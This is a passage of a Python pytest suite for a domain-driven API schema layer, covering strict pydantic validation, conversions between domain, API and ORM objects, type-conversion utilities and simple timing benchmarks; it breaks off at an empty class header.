"""
Comprehensive tests for BaseApiModel and subclasses.

Tests cover validation enforcement, error handling, conversion methods,
and performance requirements as specified in Phase 1.1.2.
"""

import time
from datetime import UTC, datetime
from decimal import Decimal
from enum import Enum
from typing import Any
from unittest.mock import patch
from uuid import UUID, uuid4

import attrs
import pytest
from pydantic import Field, ValidationError

# Explicit import to ensure coverage tracking
from src.contexts.seedwork.adapters.api_schemas.base_api_model import (
    BaseApiCommand,
    BaseApiEntity,
    BaseApiValueObject,
    TypeConversionUtility,
)
from src.contexts.seedwork.adapters.exceptions.api_schema_errors import (
    ValidationConversionError,
)
from src.contexts.seedwork.domain.commands.command import Command
from src.contexts.seedwork.domain.entity import Entity
from src.contexts.seedwork.domain.value_objects.value_object import ValueObject


# Test Enums for conversion testing
class EnumTest(Enum):
    """Test enum for conversion utilities."""

    OPTION_A = "option_a"
    OPTION_B = "option_b"
    OPTION_C = "option_c"


# Test Domain Objects
@attrs.define(frozen=True)
class DomainTestValueObject(ValueObject):
    """Test domain value object with proper attrs frozen pattern."""

    value: str
    number: int


class DomainTestEntity(Entity):
    """Test domain entity."""

    def __init__(
        self,
        id: UUID,
        name: str,
        created_at: datetime,
        updated_at: datetime | None = None,
    ):
        super().__init__(id=str(id))  # Entity expects string ID
        self.name = name
        self._created_at = created_at
        self._updated_at = updated_at if updated_at is not None else created_at

    @property
    def created_at(self) -> datetime:
        return self._created_at

    @property
    def updated_at(self) -> datetime:
        return self._updated_at


class DomainTestCommand(Command):
    """Test domain command."""

    def __init__(self, action: str, target_id: UUID):
        self.action = action
        self.target_id = target_id


# Test ORM Model
class OrmTestModel:
    """Simple mock ORM model for testing conversion methods."""

    def __init__(self, **kwargs):
        # Set default values for common ORM fields
        self.id = kwargs.get("id", "")
        self.name = kwargs.get("name", "")
        self.created_at = kwargs.get("created_at", "")
        self.updated_at = kwargs.get("updated_at", "")
        self.version = kwargs.get("version", 1)
        self.value = kwargs.get("value", "")
        self.number = kwargs.get("number", 0)
        self.action = kwargs.get("action", "")
        self.target_id = kwargs.get("target_id", "")

        # Set any additional kwargs as attributes
        for key, value in kwargs.items():
            if not hasattr(self, key):
                setattr(self, key, value)


# Test API Schema Classes
class ApiTestValueObject(BaseApiValueObject):
    """Test API value object schema."""

    value: str = Field(..., description="Test value")
    number: int = Field(..., description="Test number")

    @classmethod
    def from_domain(cls, domain_obj: DomainTestValueObject) -> "ApiTestValueObject":
        return cls(value=domain_obj.value, number=domain_obj.number)

    def to_domain(self) -> DomainTestValueObject:
        return DomainTestValueObject(value=self.value, number=self.number)

    @classmethod
    def from_orm_model(cls, orm_model: OrmTestModel) -> "ApiTestValueObject":
        return cls(value=orm_model.value, number=orm_model.number)

    def to_orm_kwargs(self) -> dict[str, Any]:
        return {"value": self.value, "number": self.number}


class ApiTestEntity(BaseApiEntity):
    """Test API entity schema."""

    name: str = Field(..., description="Entity name")

    @classmethod
    def from_domain(cls, domain_obj: DomainTestEntity) -> "ApiTestEntity":
        return cls(
            id=str(domain_obj.id),  # Domain entity ID is already string
            name=domain_obj.name,
            created_at=domain_obj.created_at,
            updated_at=domain_obj.updated_at,
        )  # type: ignore

    def to_domain(self) -> DomainTestEntity:
        id = UUID(self.id) if self.id else uuid4()
        created_at = self.created_at
        updated_at = self.updated_at

        return DomainTestEntity(
            id=id,
            name=self.name,
            created_at=created_at if created_at else datetime.now(UTC),
            updated_at=updated_at,
        )

    @classmethod
    def from_orm_model(cls, orm_model: OrmTestModel) -> "ApiTestEntity":
        return cls(
            id=orm_model.id,
            name=orm_model.name,
            created_at=datetime.fromisoformat(orm_model.created_at),
            updated_at=datetime.fromisoformat(orm_model.updated_at),
            version=orm_model.version or 1,
        )  # type: ignore

    def to_orm_kwargs(self) -> dict[str, Any]:
        return {
            "id": self.id,
            "name": self.name,
            "created_at": (
                self.created_at.isoformat()
                if self.created_at
                else datetime.now(UTC).isoformat()
            ),
            "updated_at": (
                self.updated_at.isoformat()
                if self.updated_at
                else datetime.now(UTC).isoformat()
            ),
            "version": self.version,
        }


class ApiTestCommand(BaseApiCommand):
    """Test API command schema."""

    action: str = Field(..., description="Command action")
    target_id: str = Field(..., description="Target ID")

    def to_domain(self) -> DomainTestCommand:
        target_uuid = UUID(self.target_id) if self.target_id else uuid4()
        return DomainTestCommand(action=self.action, target_id=target_uuid)


class BaseApiTestModelConfiguration:
    """Test BaseApiModel configuration enforcement."""

    @pytest.mark.unit
    def test_strict_validation_config_immutable(self):
        """Test that model configuration is properly enforced and immutable."""
        config = ApiTestValueObject.model_config

        # Verify strict validation settings using get() for safe access
        assert config.get("frozen") is True
        assert config.get("strict") is True
        assert config.get("extra") == "forbid"
        assert config.get("validate_assignment") is True
        assert config.get("from_attributes") is True
        assert config.get("use_enum_values") is True

    @pytest.mark.unit
    def test_model_immutability(self):
        """Test that models are immutable after creation."""
        obj = ApiTestValueObject(value="test", number=42)

        with pytest.raises(ValidationError):
            obj.value = "changed"

        with pytest.raises(ValidationError):
            obj.number = 100

    @pytest.mark.unit
    def test_extra_fields_forbidden(self):
        """Test that extra fields are forbidden."""
        with pytest.raises(ValidationError):
            ApiTestValueObject(value="test", number=42, extra_field="forbidden")  # type: ignore

    @pytest.mark.unit
    def test_strict_type_validation(self):
        """Test that strict type validation prevents automatic conversions."""
        # These should fail due to strict=True
        test_cases = [
            {"value": 123, "number": 42},  # int -> str conversion blocked
            {"value": "test", "number": "42"},  # str -> int conversion blocked
            {"value": True, "number": 42},  # bool -> str conversion blocked
            {"value": "test", "number": 42.0},  # float -> int conversion blocked
        ]

        for invalid_data in test_cases:
            with pytest.raises(ValidationError) as exc_info:
                ApiTestValueObject(**invalid_data)
            # Verify it's a validation error
            assert isinstance(exc_info.value, ValidationError)

    @pytest.mark.parametrize(
        "invalid_data",
        [
            {"value": "test"},  # Missing required number
            {"number": 42},  # Missing required value
            {},  # Missing all required fields
            {"value": None, "number": 42},  # None for required field
        ],
    )
    @pytest.mark.unit
    def test_required_field_validation(self, invalid_data):
        """Test that required fields are properly validated."""
        with pytest.raises(ValidationError):
            ApiTestValueObject(**invalid_data)

    @pytest.mark.parametrize(
        "valid_data",
        [
            {"value": "simple", "number": 1},
            {"value": "unicode_café_測試", "number": 0},
            {"value": "special!@#$%^&*()", "number": -999},
            {"value": "", "number": 999999},
            {"value": "very_long_string_" * 100, "number": 42},
        ],
    )
    @pytest.mark.unit
    def test_valid_data_acceptance(self, valid_data):
        """Test that valid data is accepted correctly."""
        obj = ApiTestValueObject(**valid_data)
        assert obj.value == valid_data["value"]
        assert obj.number == valid_data["number"]


class TestTypeConversionUtility:
    """Comprehensive tests for TypeConversionUtility covering all edge cases."""

    def setup_method(self):
        """Set up test fixtures."""
        self.converter = TypeConversionUtility()
        self.test_uuid = uuid4()
        self.test_datetime = datetime.now(UTC)
        self.test_enum = EnumTest.OPTION_A

    # UUID Conversion Tests
    @pytest.mark.unit
    def test_uuid_to_string_valid(self):
        """Test UUID to string conversion with valid inputs."""
        result = self.converter.uuid_to_string(self.test_uuid)
        assert result == str(self.test_uuid)
        assert isinstance(result, str)

    @pytest.mark.unit
    def test_uuid_to_string_none(self):
        """Test UUID to string conversion with None input."""
        result = self.converter.uuid_to_string(None)
        assert result is None

    @pytest.mark.unit
    def test_string_to_uuid_valid(self):
        """Test string to UUID conversion with valid inputs."""
        uuid_str = str(self.test_uuid)
        result = self.converter.string_to_uuid(uuid_str)
        assert result == self.test_uuid
        assert isinstance(result, UUID)

    @pytest.mark.unit
    def test_string_to_uuid_none(self):
        """Test string to UUID conversion with None input."""
        result = self.converter.string_to_uuid(None)
        assert result is None

    @pytest.mark.unit
    def test_string_to_uuid_invalid(self):
        """Test string to UUID conversion with invalid inputs."""
        invalid_inputs = ["not-a-uuid", "123", "", "invalid-format"]
        for invalid_input in invalid_inputs:
            with pytest.raises(ValidationConversionError) as exc_info:
                self.converter.string_to_uuid(invalid_input)
            assert isinstance(exc_info.value, ValidationConversionError)

    # Enum Conversion Tests
    @pytest.mark.unit
    def test_enum_to_string_valid(self):
        """Test enum to string conversion with valid inputs."""
        result = self.converter.enum_to_string(self.test_enum)
        assert result == "option_a"
        assert isinstance(result, str)

    @pytest.mark.unit
    def test_enum_to_string_none(self):
        """Test enum to string conversion with None input."""
        result = self.converter.enum_to_string(None)
        assert result is None

    @pytest.mark.unit
    def test_string_to_enum_valid(self):
        """Test string to enum conversion with valid inputs."""
        result = self.converter.string_to_enum("option_b", EnumTest)
        assert result == EnumTest.OPTION_B
        assert isinstance(result, EnumTest)

    @pytest.mark.unit
    def test_string_to_enum_none(self):
        """Test string to enum conversion with None input."""
        result = self.converter.string_to_enum(None, EnumTest)
        assert result is None

    @pytest.mark.unit
    def test_string_to_enum_invalid(self):
        """Test string to enum conversion with invalid inputs."""
        with pytest.raises(ValidationConversionError) as exc_info:
            self.converter.string_to_enum("invalid_option", EnumTest)
        assert isinstance(exc_info.value, ValidationConversionError)

    # Collection Conversion Tests
    @pytest.mark.unit
    def test_set_to_frozenset_valid(self):
        """Test set to frozenset conversion with valid inputs."""
        test_set = {"a", "b", "c"}
        result = self.converter.set_to_frozenset(test_set)
        assert result == frozenset(test_set)
        assert isinstance(result, frozenset)

    @pytest.mark.unit
    def test_set_to_frozenset_none(self):
        """Test set to frozenset conversion with None input."""
        result = self.converter.set_to_frozenset(None)
        assert result is None

    @pytest.mark.unit
    def test_frozenset_to_set_valid(self):
        """Test frozenset to set conversion with valid inputs."""
        test_frozenset = frozenset({"a", "b", "c"})
        result = self.converter.frozenset_to_set(test_frozenset)
        assert result == {"a", "b", "c"}
        assert isinstance(result, set)

    @pytest.mark.unit
    def test_frozenset_to_set_none(self):
        """Test frozenset to set conversion with None input."""
        result = self.converter.frozenset_to_set(None)
        assert result is None

    @pytest.mark.unit
    def test_list_to_frozenset_valid(self):
        """Test list to frozenset conversion (removes duplicates)."""
        test_list = ["a", "b", "c", "a"]  # Contains duplicate
        result = self.converter.list_to_frozenset(test_list)
        assert result == frozenset({"a", "b", "c"})
        assert isinstance(result, frozenset)

    @pytest.mark.unit
    def test_frozenset_to_list_valid(self):
        """Test frozenset to list conversion."""
        test_frozenset = frozenset({"a", "b", "c"})
        result = self.converter.frozenset_to_list(test_frozenset)
        assert set(result) == {"a", "b", "c"}  # type: ignore # Use set for comparison (order not guaranteed)
        assert isinstance(result, list)

    # DateTime Conversion Tests
    @pytest.mark.unit
    def test_datetime_to_isostring_valid(self):
        """Test datetime to ISO string conversion with valid inputs."""
        result = self.converter.datetime_to_isostring(self.test_datetime)
        assert isinstance(result, str)
        assert "T" in result  # ISO format includes T separator

    @pytest.mark.unit
    def test_datetime_to_isostring_none(self):
        """Test datetime to ISO string conversion with None input."""
        result = self.converter.datetime_to_isostring(None)
        assert result is None

    @pytest.mark.unit
    def test_isostring_to_datetime_valid(self):
        """Test ISO string to datetime conversion with valid inputs."""
        iso_string = self.test_datetime.isoformat()
        result = self.converter.isostring_to_datetime(iso_string)
        assert isinstance(result, datetime)
        # Allow small difference due to microsecond precision
        time_diff = abs((result - self.test_datetime).total_seconds())
        assert time_diff < 1.0

    @pytest.mark.unit
    def test_isostring_to_datetime_none(self):
        """Test ISO string to datetime conversion with None input."""
        result = self.converter.isostring_to_datetime(None)
        assert result is None

    @pytest.mark.unit
    def test_isostring_to_datetime_invalid(self):
        """Test that invalid ISO strings raise appropriate errors."""
        with pytest.raises(ValidationConversionError) as exc_info:
            self.converter.isostring_to_datetime("not-a-date")

        # Verify it's a conversion error
        assert isinstance(exc_info.value, ValidationConversionError)

    # Decimal Conversion Tests
    @pytest.mark.unit
    def test_decimal_to_float_valid(self):
        """Test decimal to float conversion with valid inputs."""
        test_decimal = Decimal("123.45")
        result = self.converter.decimal_to_float(test_decimal)
        assert result == 123.45
        assert isinstance(result, float)

    @pytest.mark.unit
    def test_decimal_to_float_none(self):
        """Test decimal to float conversion with None input."""
        result = self.converter.decimal_to_float(None)
        assert result is None

    @pytest.mark.unit
    def test_float_to_decimal_valid(self):
        """Test float to decimal conversion with valid inputs."""
        test_float = 123.45
        result = self.converter.float_to_decimal(test_float)
        assert result == Decimal("123.45")
        assert isinstance(result, Decimal)

    @pytest.mark.unit
    def test_float_to_decimal_precision(self):
        """Test float to decimal conversion with custom precision."""
        test_float = 123.456789
        result = self.converter.float_to_decimal(test_float, precision=3)
        assert result == Decimal("123.457")  # Rounded to 3 decimal places

    # Comma String Conversion Tests
    @pytest.mark.unit
    def test_frozenset_to_comma_string_valid(self):
        """Test frozenset to comma string conversion."""
        test_frozenset = frozenset({"apple", "banana", "cherry"})
        result = self.converter.frozenset_to_comma_string(test_frozenset)
        assert isinstance(result, str)
        # Check all items are present (order may vary)
        for item in test_frozenset:
            assert item in result

    @pytest.mark.unit
    def test_comma_string_to_frozenset_valid(self):
        """Test comma string to frozenset conversion."""
        test_string = "apple,banana,cherry"
        result = self.converter.comma_string_to_frozenset(test_string)
        assert result == frozenset({"apple", "banana", "cherry"})
        assert isinstance(result, frozenset)

    @pytest.mark.unit
    def test_comma_string_to_frozenset_whitespace(self):
        """Test comma string to frozenset conversion with whitespace."""
        test_string = " apple , banana , cherry "
        result = self.converter.comma_string_to_frozenset(test_string)
        assert result == frozenset({"apple", "banana", "cherry"})

    @pytest.mark.unit
    def test_conversion_round_trip_integrity(self):
        """Test that round-trip conversions maintain data integrity."""
        # UUID round-trip
        uuid_result = self.converter.string_to_uuid(
            self.converter.uuid_to_string(self.test_uuid)
        )
        assert uuid_result == self.test_uuid

        # Enum round-trip
        enum_result = self.converter.string_to_enum(
            self.converter.enum_to_string(self.test_enum), EnumTest
        )
        assert enum_result == self.test_enum

        # Set/Frozenset round-trip
        test_set = {"a", "b", "c"}
        set_result = self.converter.frozenset_to_set(
            self.converter.set_to_frozenset(test_set)
        )
        assert set_result == test_set


class TestBaseApiModelConversionMethods:
    """Test the four-layer conversion pattern implementation."""

    def setup_method(self):
        """Set up test data for conversion method testing."""
        self.test_uuid = uuid4()
        self.test_datetime = datetime.now(UTC)

        # Domain objects
        self.domain_vo = DomainTestValueObject(value="test_value", number=42)
        self.domain_entity = DomainTestEntity(
            id=self.test_uuid,
            name="Test Entity",
            created_at=self.test_datetime,
            updated_at=self.test_datetime,
        )
        self.domain_command = DomainTestCommand(
            action="test_action", target_id=self.test_uuid
        )

        # ORM objects
        self.orm_vo = OrmTestModel(value="test_value", number=42)
        self.orm_entity = OrmTestModel(
            id=str(self.test_uuid),
            name="Test Entity",
            created_at=TypeConversionUtility.datetime_to_isostring(self.test_datetime),
            updated_at=TypeConversionUtility.datetime_to_isostring(self.test_datetime),
            version=1,
        )

    @pytest.mark.integration
    def test_from_domain_value_object(self):
        """Test conversion from domain value object to API schema."""
        api_obj = ApiTestValueObject.from_domain(self.domain_vo)
        assert api_obj.value == "test_value"
        assert api_obj.number == 42

    @pytest.mark.integration
    def test_to_domain_value_object(self):
        """Test conversion from API schema to domain value object."""
        api_obj = ApiTestValueObject(value="test_value", number=42)
        domain_obj = api_obj.to_domain()
        assert domain_obj.value == "test_value"
        assert domain_obj.number == 42

    @pytest.mark.integration
    def test_from_domain_entity(self):
        """Test conversion from domain entity to API schema."""
        api_obj = ApiTestEntity.from_domain(self.domain_entity)
        assert api_obj.id == str(self.test_uuid)
        assert api_obj.name == "Test Entity"
        assert api_obj.created_at is not None

    @pytest.mark.integration
    def test_to_domain_entity(self):
        """Test entity conversion from API to domain."""
        api_entity = ApiTestEntity.from_domain(self.domain_entity)
        domain_obj = api_entity.to_domain()

        # Domain entity stores ID as string, so compare string representations
        assert str(domain_obj.id) == str(self.test_uuid)
        assert (
            domain_obj.name == "Test Entity"
        )  # Should match the domain entity name from setup

    @pytest.mark.integration
    def test_to_domain_command(self):
        """Test conversion from API schema to domain command."""
        api_obj = ApiTestCommand(action="test_action", target_id=str(self.test_uuid))
        domain_obj = api_obj.to_domain()
        assert domain_obj.action == "test_action"
        assert domain_obj.target_id == self.test_uuid

    @pytest.mark.integration
    def test_to_orm_kwargs_value_object(self):
        """Test conversion from API schema to ORM kwargs."""
        api_obj = ApiTestValueObject(value="test_value", number=42)
        kwargs = api_obj.to_orm_kwargs()
        assert kwargs["value"] == "test_value"
        assert kwargs["number"] == 42

    @pytest.mark.integration
    def test_from_orm_model_entity(self):
        """Test conversion from ORM model to API entity schema."""
        api_obj = ApiTestEntity.from_orm_model(self.orm_entity)
        assert api_obj.id == str(self.test_uuid)
        assert api_obj.name == "Test Entity"
        assert api_obj.version == 1

    @pytest.mark.integration
    def test_to_orm_kwargs_entity(self):
        """Test conversion from API entity schema to ORM kwargs."""
        api_obj = ApiTestEntity(
            id=str(self.test_uuid),
            name="Test Entity",
            created_at=self.test_datetime,
            updated_at=self.test_datetime,
            version=1,
        )  # type: ignore
        kwargs = api_obj.to_orm_kwargs()
        expected_keys = {"id", "name", "created_at", "updated_at", "version"}
        assert set(kwargs.keys()) == expected_keys
        assert kwargs["id"] == str(self.test_uuid)
        assert kwargs["name"] == "Test Entity"

    @pytest.mark.integration
    def test_domain_roundtrip_value_object(self):
        """Test complete round-trip: domain → API → domain for value objects."""
        api_obj = ApiTestValueObject.from_domain(self.domain_vo)
        recovered_domain = api_obj.to_domain()
        assert recovered_domain == self.domain_vo

    @pytest.mark.integration
    def test_domain_roundtrip_entity(self):
        """Test complete round-trip: domain → API → domain for entities."""
        api_obj = ApiTestEntity.from_domain(self.domain_entity)
        recovered_domain = api_obj.to_domain()
        assert recovered_domain.id == self.domain_entity.id
        assert recovered_domain.name == self.domain_entity.name

    @pytest.mark.integration
    def test_orm_roundtrip_value_object(self):
        """Test complete round-trip: ORM → API → ORM for value objects."""
        api_obj = ApiTestValueObject.from_orm_model(self.orm_vo)
        recovered_kwargs = api_obj.to_orm_kwargs()
        assert recovered_kwargs["value"] == self.orm_vo.value
        assert recovered_kwargs["number"] == self.orm_vo.number


class TestBaseApiModelErrorHandling:
    """Test error handling and validation patterns."""

    @pytest.mark.unit
    def test_validation_conversion_error_structure(self):
        """Test that validation errors have proper structure."""
        # Test that pydantic validation errors maintain proper structure
        with pytest.raises(ValidationError) as exc_info:
            ApiTestValueObject(value="test")  # type: ignore # Missing required number field

        error = exc_info.value
        assert len(error.errors()) > 0

    @pytest.mark.unit
    def test_conversion_method_error_propagation(self):
        """Test that conversion methods properly propagate errors."""

        class FailingApiModel(BaseApiValueObject):
            value: str

            @classmethod
            def from_domain(cls, domain_obj):
                raise RuntimeError("Intentional test failure")

            def to_domain(self):
                raise RuntimeError("Intentional test failure")

            @classmethod
            def from_orm_model(cls, orm_model):
                raise RuntimeError("Intentional test failure")

            def to_orm_kwargs(self):
                raise RuntimeError("Intentional test failure")

        instance = FailingApiModel(value="test")

        # Test that methods propagate errors properly
        with pytest.raises(RuntimeError, match="Intentional test failure"):
            instance.to_domain()

        with pytest.raises(RuntimeError, match="Intentional test failure"):
            FailingApiModel.from_domain("dummy")

        with pytest.raises(RuntimeError, match="Intentional test failure"):
            FailingApiModel.from_orm_model("dummy")

        with pytest.raises(RuntimeError, match="Intentional test failure"):
            instance.to_orm_kwargs()

    @pytest.mark.unit
    def test_invalid_input_handling(self):
        """Test handling of various invalid inputs to conversion methods."""
        # Test invalid input to from_domain
        with pytest.raises(Exception):  # Could be ValueError, TypeError, etc.
            ApiTestValueObject.from_domain(None)  # type: ignore

        with pytest.raises(Exception):
            ApiTestValueObject.from_domain("not_an_object")  # type: ignore

        # Test invalid input to from_orm_model
        with pytest.raises(Exception):
            ApiTestValueObject.from_orm_model(None)  # type: ignore

        with pytest.raises(Exception):
            ApiTestValueObject.from_orm_model(42)  # type: ignore


class TestBaseApiModelPerformance:
    """Performance tests validating benchmark requirements."""

    @pytest.mark.performance
    def test_model_initialization_performance(self):
        """Test that model initialization meets <1ms requirement."""
        start_time = time.perf_counter()

        # Create 100 instances to get reliable timing
        for _ in range(100):
            ApiTestValueObject(value="test", number=42)

        end_time = time.perf_counter()
        avg_time_ms = ((end_time - start_time) / 100) * 1000

        # Should be well under 1ms per instance
        assert (
            avg_time_ms < 1.0
        ), f"Average initialization time {avg_time_ms:.3f}ms exceeds 1ms limit"

    @pytest.mark.performance
    def test_conversion_method_performance(self):
        """Test that conversion methods meet <5ms requirement."""
        domain_obj = DomainTestValueObject(value="test", number=42)
        orm_obj = OrmTestModel(value="test", number=42)

        # Test from_domain performance
        start_time = time.perf_counter()
        for _ in range(100):
            ApiTestValueObject.from_domain(domain_obj)
        end_time = time.perf_counter()
        avg_from_domain_ms = ((end_time - start_time) / 100) * 1000

        # Test to_domain performance
        api_obj = ApiTestValueObject(value="test", number=42)
        start_time = time.perf_counter()
        for _ in range(100):
            api_obj.to_domain()
        end_time = time.perf_counter()
        avg_to_domain_ms = ((end_time - start_time) / 100) * 1000

        # Test from_orm_model performance
        start_time = time.perf_counter()
        for _ in range(100):
            ApiTestValueObject.from_orm_model(orm_obj)
        end_time = time.perf_counter()
        avg_from_orm_ms = ((end_time - start_time) / 100) * 1000

        # Test to_orm_kwargs performance
        start_time = time.perf_counter()
        for _ in range(100):
            api_obj.to_orm_kwargs()
        end_time = time.perf_counter()
        avg_to_orm_ms = ((end_time - start_time) / 100) * 1000

        # All should be well under 5ms
        assert (
            avg_from_domain_ms < 5.0
        ), f"from_domain {avg_from_domain_ms:.3f}ms exceeds 5ms limit"
        assert (
            avg_to_domain_ms < 5.0
        ), f"to_domain {avg_to_domain_ms:.3f}ms exceeds 5ms limit"
        assert (
            avg_from_orm_ms < 5.0
        ), f"from_orm_model {avg_from_orm_ms:.3f}ms exceeds 5ms limit"
        assert (
            avg_to_orm_ms < 5.0
        ), f"to_orm_kwargs {avg_to_orm_ms:.3f}ms exceeds 5ms limit"

    @pytest.mark.performance
    def test_bulk_operations_performance(self):
        """Test bulk operations meet <100ms for 1000+ objects requirement."""
        # Create 1000 domain objects
        domain_objects = [
            DomainTestValueObject(value=f"test_{i}", number=i) for i in range(1000)
        ]

        # Test bulk conversion performance
        start_time = time.perf_counter()
        api_objects = [ApiTestValueObject.from_domain(obj) for obj in domain_objects]
        end_time = time.perf_counter()

        bulk_time_ms = (end_time - start_time) * 1000
        assert (
            bulk_time_ms < 100.0
        ), f"Bulk conversion {bulk_time_ms:.3f}ms exceeds 100ms limit"

        # Verify all objects were converted correctly
        assert len(api_objects) == 1000
        for i, api_obj in enumerate(api_objects):
            assert api_obj.value == f"test_{i}"
            assert api_obj.number == i

    @pytest.mark.performance
    def test_complex_object_performance(self):
        """Test performance with complex objects containing multiple fields."""
        # Create a more complex entity
        complex_entity = DomainTestEntity(
            id=uuid4(),
            name="Complex Entity with Long Name and Special Characters !@#$%",
            created_at=datetime.now(UTC),
            updated_at=datetime.now(UTC),
        )

        start_time = time.perf_counter()
        for _ in range(100):
            api_obj = ApiTestEntity.from_domain(complex_entity)
            recovered = api_obj.to_domain()
        end_time = time.perf_counter()

        avg_time_ms = ((end_time - start_time) / 100) * 1000
        assert (
            avg_time_ms < 10.0
        ), f"Complex object round-trip {avg_time_ms:.3f}ms exceeds 10ms limit"


class TestBaseEntitySpecificFeatures:
    """Test entity-specific functionality and validation."""

    @pytest.mark.unit
    def test_base_entity_required_fields(self):
        """Test that BaseEntity has all required fields with correct types."""
        entity = ApiTestEntity(
            id=str(uuid4()),
            name="Test",
            created_at=datetime.fromisoformat("2024-01-01T00:00:00Z"),
            updated_at=datetime.fromisoformat("2024-01-01T00:00:00Z"),
        )  # type: ignore

        # Check required fields exist
        assert hasattr(entity, "id")
        assert hasattr(entity, "created_at")
        assert hasattr(entity, "updated_at")
        assert hasattr(entity, "version")
        assert hasattr(entity, "discarded")

        # Check default values
        assert entity.version == 1
        assert entity.discarded is False

    @pytest.mark.unit
    def test_base_entity_version_validation(self):
        """Test that entity version field is properly validated."""
        # Valid version
        entity = ApiTestEntity(
            id=str(uuid4()),
            name="Test",
            version=5,
            created_at=datetime.fromisoformat("2024-01-01T00:00:00Z"),
            updated_at=datetime.fromisoformat("2024-01-01T00:00:00Z"),
        )  # type: ignore
        assert entity.version == 5

        # Invalid version (must be >= 1)
        with pytest.raises(ValidationError):
            ApiTestEntity(
                id=str(uuid4()),
                name="Test",
                version=0,
                created_at=datetime.fromisoformat("2024-01-01T00:00:00Z"),
                updated_at=datetime.fromisoformat("2024-01-01T00:00:00Z"),
            )  # type: ignore

        with pytest.raises(ValidationError):
            ApiTestEntity(
                id=str(uuid4()),
                name="Test",
                version=-1,
                created_at=datetime.fromisoformat("2024-01-01T00:00:00Z"),
                updated_at=datetime.fromisoformat("2024-01-01T00:00:00Z"),
            )  # type: ignore

    @pytest.mark.unit
    def test_base_id_format(self):
        """Test that entity ID field accepts valid UUID strings."""
        valid_uuid = str(uuid4())
        entity = ApiTestEntity(
            id=valid_uuid,
            name="Test",
            created_at=datetime.fromisoformat("2024-01-01T00:00:00Z"),
            updated_at=datetime.fromisoformat("2024-01-01T00:00:00Z"),
        )  # type: ignore
        assert entity.id == valid_uuid


class TestBaseValueObjectFeatures:
    """Test value object-specific functionality."""

    @pytest.mark.unit
    def test_value_object_immutability(self):
        """Test that value objects are properly immutable."""
        vo = ApiTestValueObject(value="test", number=42)

        # Should not be able to modify fields
        with pytest.raises(ValidationError):
            vo.value = "changed"

        with pytest.raises(ValidationError):
            vo.number = 999

    @pytest.mark.unit
    def test_value_object_equality(self):
        """Test that value objects implement proper equality semantics."""
        vo1 = ApiTestValueObject(value="test", number=42)
        vo2 = ApiTestValueObject(value="test", number=42)
        vo3 = ApiTestValueObject(value="different", number=42)

        # Same values should be equal
        assert vo1.model_dump() == vo2.model_dump()

        # Different values should not be equal
        assert vo1.model_dump() != vo3.model_dump()


class TestBaseCommandFeatures:
    """Test command-specific functionality."""

    @pytest.mark.unit
    def test_command_structure(self):
        """Test that commands have proper structure."""
        command = ApiTestCommand(action="test_action", target_id=str(uuid4()))

        assert hasattr(command, "action")
        assert hasattr(command, "target_id")
        assert command.action == "test_action"

    @pytest.mark.unit
    def test_command_validation(self):
        """Test command field validation."""
        # Valid command
        command = ApiTestCommand(action="create", target_id=str(uuid4()))
        assert command.action == "create"

        # Missing required fields should fail
        with pytest.raises(ValidationError):
            ApiTestCommand(target_id=str(uuid4()))  # type: ignore # Missing action

        with pytest.raises(ValidationError):
            ApiTestCommand(action="create")  # type: ignore # Missing target_id


class TestFieldValidationPatterns:
    """Test comprehensive field validation patterns as specified in documentation."""

    @pytest.mark.parametrize(
        "valid_input",
        [
            "simple_string",
            "String with spaces",
            "String_with_underscores",
            "String-with-hyphens",
            "String123WithNumbers",
            "StringWithUnicode测试",
            "String!@#$%^&*()WithSpecialChars",
            "",  # Empty string should be valid
        ],
    )
    @pytest.mark.unit
    def test_valid_string_inputs(self, valid_input):
        """Test that valid string inputs are accepted."""
        obj = ApiTestValueObject(value=valid_input, number=42)
        assert obj.value == valid_input

    @pytest.mark.parametrize(
        "valid_number",
        [
            0,
            1,
            -1,
            999999,
            -999999,
            42,
        ],
    )
    @pytest.mark.unit
    def test_valid_number_inputs(self, valid_number):
        """Test that valid number inputs are accepted."""
        obj = ApiTestValueObject(value="test", number=valid_number)
        assert obj.number == valid_number

    @pytest.mark.parametrize(
        "invalid_string_type",
        [
            123,  # int instead of str
            123.45,  # float instead of str
            True,  # bool instead of str
            [],  # list instead of str
            {},  # dict instead of str
            None,  # None instead of str (for required field)
        ],
    )
    @pytest.mark.unit
    def test_invalid_string_type_inputs(self, invalid_string_type):
        """Test that invalid string type inputs are rejected."""
        with pytest.raises(ValidationError):
            ApiTestValueObject(value=invalid_string_type, number=42)

    @pytest.mark.parametrize(
        "invalid_number_type",
        [
            "123",  # str instead of int
            123.45,  # float instead of int
            True,  # bool instead of int
            [],  # list instead of int
            {},  # dict instead of int
            None,  # None instead of int (for required field)
        ],
    )
    @pytest.mark.unit
    def test_invalid_number_type_inputs(self, invalid_number_type):
        """Test that invalid number type inputs are rejected."""
        with pytest.raises(ValidationError):
            ApiTestValueObject(value="test", number=invalid_number_type)

    @pytest.mark.unit
    def test_strict_validation_enforcement(self):
        """Test that strict validation prevents automatic type conversions."""
        # These should all fail due to strict=True
        test_cases = [
            {"value": 123, "number": 42},  # int -> str conversion blocked
            {"value": "test", "number": "42"},  # str -> int conversion blocked
            {"value": True, "number": 42},  # bool -> str conversion blocked
            {"value": "test", "number": 42.0},  # float -> int conversion blocked
        ]

        for invalid_data in test_cases:
            with pytest.raises(ValidationError) as exc_info:
                ApiTestValueObject(**invalid_data)
            # Verify it's a validation error
            assert isinstance(exc_info.value, ValidationError)


class TestBaseApiModelIntegration:
    """Integration tests for real-world usage scenarios."""

    @pytest.mark.integration
    def test_json_serialization(self):
        """Test JSON serialization works correctly."""
        obj = ApiTestValueObject(value="test", number=42)
        json_data = obj.model_dump_json()

        assert '"value":"test"' in json_data
        assert '"number":42' in json_data

    @pytest.mark.integration
    def test_json_deserialization(self):
        """Test JSON deserialization works correctly."""
        json_data = '{"value":"test","number":42}'
        obj = ApiTestValueObject.model_validate_json(json_data)

        assert obj.value == "test"
        assert obj.number == 42

    @pytest.mark.integration
    def test_nested_conversion_scenario(self):
        """Test complex nested conversion scenarios."""
        # Create complex entity with multiple conversions
        id = uuid4()
        created_time = datetime.now(UTC)

        domain_entity = DomainTestEntity(
            id=id,
            name="Complex Test Entity",
            created_at=created_time,
            updated_at=created_time,
        )

        # Convert to API and back
        api_entity = ApiTestEntity.from_domain(domain_entity)
        recovered_entity = api_entity.to_domain()

        # Verify all conversions worked - compare string representations
        assert str(recovered_entity.id) == str(id)
        assert recovered_entity.name == "Complex Test Entity"
        assert abs((recovered_entity.created_at - created_time).total_seconds()) < 1.0


class TestEnhancedEntityPatterns:
